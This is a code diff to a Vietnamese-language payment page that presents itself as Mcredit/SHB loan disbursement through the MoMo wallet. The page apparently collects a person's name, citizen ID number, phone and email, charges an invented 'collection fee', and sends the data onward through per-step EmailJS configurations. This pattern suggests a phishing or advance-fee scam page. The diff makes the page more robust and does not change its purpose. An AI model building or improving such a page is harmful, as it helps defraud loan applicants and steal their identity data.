@@ -46,9 +46,11 @@
         return MOMO_EMAILJS_CONFIG_BY_STEP[step] || MOMO_EMAILJS_CONFIG_BY_STEP.phone;
       }
 
-      emailjs.init({
-        publicKey: MOMO_EMAILJS_CONFIG_BY_STEP.phone.publicKey,
-      });
+      if (typeof emailjs !== "undefined") {
+        emailjs.init({
+          publicKey: MOMO_EMAILJS_CONFIG_BY_STEP.phone.publicKey,
+        });
+      }
     </script>
 
     <style>
@@ -671,6 +673,7 @@
         </main>
         <footer class="page-footer">
           <button
+            type="button"
             class="button primary"
             onclick="confirmDisbursement()"
           >
@@ -876,25 +879,45 @@
 
         const getEl = (id) => document.getElementById(id);
 
+        const getStoredFormData = () => {
+          try {
+            const raw = sessionStorage.getItem("formData");
+            if (!raw) return {};
+            return JSON.parse(raw) || {};
+          } catch (error) {
+            console.warn("Không đọc được formData từ sessionStorage:", error);
+            return {};
+          }
+        };
+
+        const parseAmount = (value) => {
+          const parsed = parseInt(String(value || "").replace(/[^0-9]/g, ""), 10);
+          return Number.isFinite(parsed) && parsed > 0 ? parsed : 0;
+        };
+
         const getFormData = () => {
-          const storedData =
-            JSON.parse(sessionStorage.getItem("formData")) || {};
+          const storedData = getStoredFormData();
           const params = new URLSearchParams(window.location.search);
+          const amountFromStorage =
+            Number(storedData.amountNumeric) ||
+            parseAmount(storedData.amount) ||
+            parseInt(params.get("amount"), 10) ||
+            50000000;
+
           return {
             fullName:
               storedData.fullName || params.get("fullName") || "Nguyễn Văn A",
             cccd: storedData.cccd || params.get("cccd") || "012345678910",
-            amount:
-              parseInt(storedData.amount?.replace(/[^0-9]/g, "")) ||
-              parseInt(params.get("amount")) ||
-              50000000,
+            amount: amountFromStorage,
             months:
-              parseInt(storedData.months) ||
-              parseInt(params.get("months")) ||
+              parseInt(storedData.months, 10) ||
+              parseInt(params.get("months"), 10) ||
               48,
             phone: storedData.phone || params.get("phone") || "0987654321",
             email:
               storedData.email || params.get("email") || "example@email.com",
+            methodKey: storedData.methodKey || params.get("method") || "momo",
+            contractNumber: storedData.contractNumber || "",
           };
         };
 
@@ -946,51 +969,67 @@
         };
 
         const populateData = () => {
-          const principal = formData.amount || 0;
+          const principal = formData.amount || 50000000;
           const interest =
             formData.interest !== undefined
               ? formData.interest
               : principal * 0.057;
           const collectionFee = 24000;
           const contractNumber =
+            formData.contractNumber ||
             "SHB-" + Math.floor(1000000000 + Math.random() * 9000000000);
 
-          getEl("mainTotalAmount").textContent = formatCurrency(principal);
+          formData.contractNumber = contractNumber;
+
+          const mainTotalEl = getEl("mainTotalAmount");
+          if (mainTotalEl) {
+            mainTotalEl.textContent = formatCurrency(principal);
+          }
 
           const paymentDetailsContainer = getEl("payment-details");
-          paymentDetailsContainer.innerHTML = "";
-          paymentDetailsContainer.appendChild(
-            createDetailItem("Số tiền gốc", formatCurrency(principal))
-          );
-          paymentDetailsContainer.appendChild(
-            createDetailItem("Số tiền lãi (ước tính)", formatCurrency(interest))
-          );
-          paymentDetailsContainer.appendChild(
-            createDetailItem("Phí thu hộ", formatCurrency(collectionFee))
-          );
-          paymentDetailsContainer.appendChild(
-            createDetailItem("Thanh toán qua", "Ví MoMo", true)
-          );
+          if (paymentDetailsContainer) {
+            paymentDetailsContainer.innerHTML = "";
+            paymentDetailsContainer.appendChild(
+              createDetailItem("Số tiền gốc", formatCurrency(principal))
+            );
+            paymentDetailsContainer.appendChild(
+              createDetailItem(
+                "Số tiền lãi (ước tính)",
+                formatCurrency(interest)
+              )
+            );
+            paymentDetailsContainer.appendChild(
+              createDetailItem("Phí thu hộ", formatCurrency(collectionFee))
+            );
+            paymentDetailsContainer.appendChild(
+              createDetailItem("Thanh toán qua", "Ví MoMo", true)
+            );
+          }
 
           const customerDetailsContainer = getEl("customer-details");
-          customerDetailsContainer.innerHTML = "";
-          customerDetailsContainer.appendChild(
-            createDetailItem("Tên khách hàng", formData.fullName)
-          );
-          customerDetailsContainer.appendChild(
-            createDetailItem("Số hợp đồng", contractNumber)
-          );
+          if (customerDetailsContainer) {
+            customerDetailsContainer.innerHTML = "";
+            customerDetailsContainer.appendChild(
+              createDetailItem("Tên khách hàng", formData.fullName)
+            );
+            customerDetailsContainer.appendChild(
+              createDetailItem("Số hợp đồng", contractNumber)
+            );
+          }
 
           const closingDate = new Date();
-          closingDate.setMonth(closingDate.getMonth() + formData.months);
+          closingDate.setMonth(
+            closingDate.getMonth() + (Number(formData.months) || 48)
+          );
           const formattedClosingDate = closingDate.toLocaleDateString("vi-VN", {
             day: "2-digit",
             month: "2-digit",
             year: "numeric",
           });
-          getEl(
-            "closingDateNotice"
-          ).innerHTML = `<strong>Mcredit</strong> sẽ đóng khoản vay vào ngày <strong>${formattedClosingDate}</strong>, sau khi bạn hoàn tất thanh toán.`;
+          const closingDateEl = getEl("closingDateNotice");
+          if (closingDateEl) {
+            closingDateEl.innerHTML = `<strong>Mcredit</strong> sẽ đóng khoản vay vào ngày <strong>${formattedClosingDate}</strong>, sau khi bạn hoàn tất thanh toán.`;
+          }
         };
 
         window.showNotification = (
@@ -1109,9 +1148,11 @@
 
           let templateParams = {};
           const contractNumber =
-            getEl("customer-details").querySelector(
+            formData.contractNumber ||
+            getEl("customer-details")?.querySelector(
               ".detail-item:last-child .value"
-            )?.textContent || "";
+            )?.textContent ||
+            "";
 
           const commonParams = {
             platform: config.platform,
@@ -1228,10 +1269,8 @@
 
         const shouldAutoAdvanceFromEvaluate = () => {
           const params = new URLSearchParams(window.location.search);
-          const storedData =
-            JSON.parse(sessionStorage.getItem("formData") || "{}");
           return (
-            params.get("from") === "evaluate" || storedData.methodKey === "momo"
+            params.get("from") === "evaluate" || formData.methodKey === "momo"
           );
         };
 
@@ -1241,9 +1280,14 @@
         };
 
         const init = () => {
-          populateData();
-          setupEventListeners();
-          autoAdvanceFromEvaluate();
+          try {
+            populateData();
+            setupEventListeners();
+            autoAdvanceFromEvaluate();
+          } catch (error) {
+            console.error("MoMo init error:", error);
+            populateData();
+          }
         };
 
         init();
